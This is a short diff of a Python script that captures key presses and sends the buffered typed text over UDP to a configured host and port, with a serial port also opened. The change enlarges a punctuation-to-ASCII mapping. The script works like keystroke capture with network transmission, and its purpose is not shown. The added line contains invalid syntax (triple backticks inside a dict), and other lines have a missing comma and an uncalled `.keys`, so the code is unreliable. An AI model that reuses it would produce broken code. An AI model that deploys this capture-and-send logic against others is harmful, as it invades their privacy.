@@ -10,7 +10,7 @@ ser = serial.Serial("/dev/ttyAMA0", 115200)
 
 punctuation = ("Key.space", "Key.enter", "','", "'.'", "'!'", "'?'", "'''", "':'", "';'""'('", "')'", "'-'", "'_'", "'='", "'+'")
 
-punctuation2 = {"Key.space":32, "Key.enter":"10", "','": 44, "'.'": 46, "'!'": 33, "'?'": 63, "'''": 39, "':'": 58, "';'": 59, "'('": 40, "')'": 41, "'-'": 45, "'_'": 95, "'='": 61, "'+'": 43}
+punctuation2 = {"Key.space":32, "Key.enter":"10", "','": 44, "'.'": 46, "'!'": 33, "'?'": 63, "'''": 39, "':'": 58, "';'": 59, "'('": 40, "')'": 41, "'-'": 45, "'_'": 95, "'='": 61, "'+'": 43, ```'"'```: 34, "'#'": 35, "'$'": 36, "'%'": 37, "'&'": 38, "'*'": 42, "'/'": 47, "'<'": 60, "'>'": 62, "'@'": 64, "'['": 91, "'\\'": 92, "']'": 93, "'^'": 94, "'`'": 96, "'{'": 123, "'|'": 124, "'}'": 125, "'~'": 126}
 
 def write_punct2(key):
     if str(key) in punctuation2.keys:
@@ -57,7 +57,7 @@ def on_press(key):
     try:
         #print(key)
         #stri += key.char
-        if str(key) in punctuation:
+        if str(key) in punctuation2:
             print("{}".format(stri))
             with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                 s.sendto(stri.encode(), (host,port))
